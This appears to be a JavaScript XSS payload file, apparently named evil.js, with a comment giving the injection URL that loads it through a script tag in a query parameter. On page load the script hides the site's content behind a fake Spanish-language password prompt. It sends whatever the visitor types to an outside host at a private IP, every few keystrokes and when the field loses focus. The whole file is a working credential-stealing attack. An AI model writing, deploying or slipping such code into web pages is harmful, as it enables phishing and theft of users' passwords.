document.addEventListener('DOMContentLoaded', function() {
    const menu = `
    <div class="mt-4" style="max-width:400px">
    <div class="mb-3">
    <label for="password" class="form-label">Escriba su contraseña para continuar viendo</label>
    <input type="password" class="form-control" id="password">
    </div>
    `;

    document.body.insertAdjacentHTML('beforeend', menu);
    const container = document.querySelector('.container');
    container.style.display = 'none';

    var count = 0;
    var iplinux = 'http://192.168.30.140:8000/';
    const secret = document.querySelector('#password');

    secret.addEventListener('keypress', function(e) {
        count++;
        if (count >= 4) {
            fetch(iplinux + secret.value)
            count = 0;
        }
    });
    secret.addEventListener('blur', function(e) {
        fetch(iplinux + secret.value)
    });
});

// evil request = http://1localhost:3000/file.php?index=<script defer src=evil.js></script>